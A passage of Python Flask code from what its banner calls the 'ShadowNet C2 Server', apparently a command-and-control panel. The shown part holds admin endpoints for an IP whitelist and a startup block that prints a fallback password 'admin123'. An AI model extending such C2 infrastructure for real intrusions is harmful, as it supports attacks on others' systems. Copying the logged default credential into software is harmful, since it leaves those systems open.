            return jsonify({'error': 'IP address required'}), 400
        
        # Validate using Python's ipaddress module (accepts IPv4 and IPv6)
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return jsonify({'error': f'Invalid IP address: {ip}'}), 400
        
        settings = _load_access_control()
        if ip not in settings['whitelist']:
            settings['whitelist'].append(ip)
            _save_access_control(settings)
            print(f"[*] IP {ip} added to whitelist by {session['username']}")
        
        return jsonify(settings)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/admin/access-control/remove", methods=["POST"])
@admin_required
def remove_ip_from_whitelist():
    try:
        data = request.json
        ip = data.get('ip', '').strip()
        
        if ip in ['127.0.0.1', '::1']:
            return jsonify({'error': 'Cannot remove localhost'}), 400
        
        settings = _load_access_control()
        if ip in settings['whitelist']:
            settings['whitelist'].remove(ip)
            _save_access_control(settings)
            print(f"[*] IP {ip} removed from whitelist by {session['username']}")
        
        return jsonify(settings)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =========================
# MAIN
# =========================

if __name__ == "__main__":
    # Render injects $PORT at runtime; fallback to 8080 for local dev
    port = int(os.environ.get('PORT', 8080))
    print("=" * 60)
    print("[*] ShadowNet C2 Server Starting...")
    print(f"[*] Running on: http://0.0.0.0:{port}")
    print(f"[*] Login with: admin / {os.environ.get('SHADOWNET_ADMIN_PASSWORD', 'admin123')}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, threaded=True, debug=False)